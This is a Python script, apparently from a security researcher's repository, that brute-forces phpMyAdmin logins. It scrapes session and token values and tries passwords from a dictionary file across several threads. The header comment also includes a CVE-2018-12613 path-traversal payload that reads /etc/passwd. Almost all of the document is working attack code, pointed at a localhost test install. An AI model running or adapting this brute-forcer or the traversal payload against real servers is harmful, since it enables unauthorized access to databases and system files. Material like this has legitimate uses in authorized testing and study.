#!/usr/bin/env python
# -*- coding:utf-8 -*-
"""
@Author: 昏鸦
@Date：2019-06-11
@Description：
PHPMyAdmin-Brute-Force-Login
@Tips:
CVE-2018-12613
index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
"""
import requests
import re
import html
import threading
import sys
import getopt

def usage():
	info = """
USEAGE:
	pma-brute.py -u <username> -f <filename> -t <threadnum>
OPTIONS:
	-h, --help			Show help
	-u, --user			Set username
	-f, --file			Dictionary file to brute password
	-t, --thread			Set num of threads to run
	"""
	print(info)

def login(url, header, data, cookie):
	# Init
	s = requests.session()
	s.keep_alive = False

	# Get Cookie and Token
	res1 = s.get(url=url)
	tmp1 = re.search("name=\"set_session\" value=\"(.*?)\" />", res1.text)
	tmp2 = re.search("name=\"token\" value=\"(.*?)\" /></fieldset>", res1.text)
	cookie['phpMyAdmin'] = tmp1.group(1)
	data['set_session'] = tmp1.group(1)
	data['token'] = html.unescape(tmp2.group(1))

	# Try Logging
	res2 = s.post(url=url, headers=header, data=data, cookies=cookie, allow_redirects=False)

	return res2.status_code, res2.content

def brute(dic, user='root'):
	# Config
	url = 'http://127.0.0.1/phpmyadmin-4.9.0.1/index.php'
	header = {
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0',
		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
		'Content-Type':'application/x-www-form-urlencoded',
		'Upgrade-Insecure-Requests':'1',
		'Pragma':'no-cache',
		'Cache-Control':'no-cache',
		'Connection':'close'
	}
	cookie = {
		'phpMyAdmin':'',
		'pma_lang':'zh_CN'
	}
	data = {
		'set_session':'',
		'pma_username':user,
		'pma_password':'',
		'server':'1',
		'target':r'index.php',
		'token':''
	}

	# Brute
	flag1 = 1
	for pwd in dic:
		if flag1 == 1:
			flag2 = 1
			while (flag2):
				data['pma_password'] = pwd.strip()
				print("TryingPassword:" + pwd.strip())
				status, res = login(url=url, header=header, data=data, cookie=cookie)

				# Check Response
				if status == 302:
					print("[!] Success!")
					print("[+] Username:" + data['pma_username'])
					print("[+] Password:" + data['pma_password'])
					flag1 = 0
					flag2 = 0
				elif b'Access denied' in res:
					# print("[!] Failed!")
					flag2 = 0
				elif b'Failed to set session cookie' in res:
					print("[!] Cookie Error!")
					flag2 = 1
				else:
					print("[!] Unknow Error!")
					flag1 = 1
					flag2 = 1
		else:
			break

def main():
	# Parse Args
	try:
		opts, args = getopt.getopt(sys.argv[1:],'-h-u:-f:-t:',['help','user=','file=','thread='])
	except getopt.GetoptError:
		usage()
		sys.exit()
	if opts:
		for opt, arg in opts:
			if opt in ("-h", "--help"):
				usage()
				sys.exit()
			if opt in ("-u", "--user"):
				user = arg
			if opt in ("-f", "--file"):
				file = arg
			if opt in ("-t", "--thread"):
				threadNum = int(arg)
	else:
		usage()
		sys.exit()

	# Load Dictionary
	with open(file,'r') as f:
		dic = f.readlines()

	# Create Thread Pool
	threads = []
	for i in range(threadNum):
		t = threading.Thread(target=brute, args=(dic[0+i:len(dic):threadNum], user,))
		threads.append(t)

	# Start Thread
	for t in threads:
		t.start()
	for t in threads:
		t.join()

if __name__ == '__main__':
	main()